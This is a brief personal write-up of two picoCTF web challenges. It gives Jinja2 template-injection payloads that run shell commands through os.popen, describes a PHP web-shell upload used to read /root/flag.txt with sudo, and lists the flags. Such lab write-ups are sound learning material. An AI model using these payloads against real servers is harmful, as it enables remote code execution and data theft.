# Pico-CTF

CTF #1
The first CTF that I did on the pico site is the SSTI1 CTF.

The description of the ctf is:
I made a cool website where you can announce whatever you want! Try it out!
Additional details will be available after launching your challenge instance.
The first hint is:
Server Side Template Injection

The main bulk of this ctf is injecting commands into a notification line on a hosted website that has little security. 
Using Jinja2 there the command {{config.items()}} allows you to see configuration data, one thing revealed is ('SECRET_KEY', None),

The following remote injection will show globals within the directory of the server.
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('ls').read() }}

Using this shows a file called flagrequirements.txt

The following injection will read the previous file giving the flag.
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat flag').read() }}

The flag is: picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_424a1494}

CTF #2
The second CTF that I did is n0s4n1ty 1.

The description of the ctf is:
A developer has added profile picture upload functionality to a website. However, the implementation is flawed, and it presents an opportunity for you. Your mission, should you choose to accept it, is to navigate to the provided web page and locate the file upload area. Your ultimate goal is to find the hidden flag located in the /root directory.
Additional details will be available after launching your challenge instance.
The hints are:
File upload was not sanitized
Whenever you get a shell on a remote machine, check sudo -l

The main point of this ctf is inputing a php shell to the server which unloads a script that the hacker writes instead of a profile picture.
Using scripts you can check the permissions of the user and can find out that there is no password to access the root. 
The following url will lead to the final ctf as the root user:
http://standard-pizzas.picoctf.net:63914/uploads/shell.php?cmd=sudo cat /root/flag.txt

The flag is: picoCTF{wh47_c4n_u_d0_wPHP_f7424fc7

